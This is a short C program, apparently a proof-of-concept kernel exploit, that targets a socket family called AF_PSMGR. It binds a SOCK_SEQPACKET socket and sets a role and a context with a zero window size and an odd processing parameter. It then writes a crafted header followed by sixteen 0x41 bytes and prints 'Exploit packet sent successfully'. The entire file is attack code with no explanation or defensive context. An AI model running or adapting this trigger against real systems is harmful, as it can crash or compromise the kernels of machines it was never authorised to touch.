#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>

#define AF_PSMGR 46
#define SOCK_SEQPACKET 5
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_LOCAL_CTX 4
#define MANAGED 1

struct sockaddr_psmgr {
    unsigned short spsmgr_family;
    unsigned short spsmgr_id;
};

struct psmgr_ctx {
    unsigned int xfrm_type;
    unsigned int enc_mode;
    unsigned int window_sz;
    unsigned int proc_param;
};

struct psmgr_msg_hdr {
    unsigned char msg_type;
    unsigned short session_id_lo;
    unsigned short payload_len;
    unsigned int seq;
};

int main() {
    int fd;
    struct sockaddr_psmgr addr;
    struct psmgr_ctx ctx;
    struct psmgr_msg_hdr hdr;
    unsigned char payload[16];
    unsigned char buffer[sizeof(struct psmgr_msg_hdr) + 16];
    int role = MANAGED;

    fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.spsmgr_family = AF_PSMGR;
    addr.spsmgr_id = 1;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(fd);
        return 1;
    }

    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        perror("setsockopt set_role");
        close(fd);
        return 1;
    }

    memset(&ctx, 0, sizeof(ctx));
    ctx.xfrm_type = 2;
    ctx.enc_mode = 1;
    ctx.window_sz = 0;
    ctx.proc_param = 127;

    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) {
        perror("setsockopt local_ctx");
        close(fd);
        return 1;
    }

    memset(&hdr, 0, sizeof(hdr));
    hdr.msg_type = 5;
    hdr.session_id_lo = 1;
    hdr.payload_len = 16;
    hdr.seq = 1;

    memset(payload, 0x41, 16);

    memcpy(buffer, &hdr, sizeof(hdr));
    memcpy(buffer + sizeof(hdr), payload, 16);

    if (write(fd, buffer, sizeof(buffer)) < 0) {
        perror("write");
        close(fd);
        return 1;
    }

    printf("Exploit packet sent successfully\n");
    close(fd);
    return 0;
}

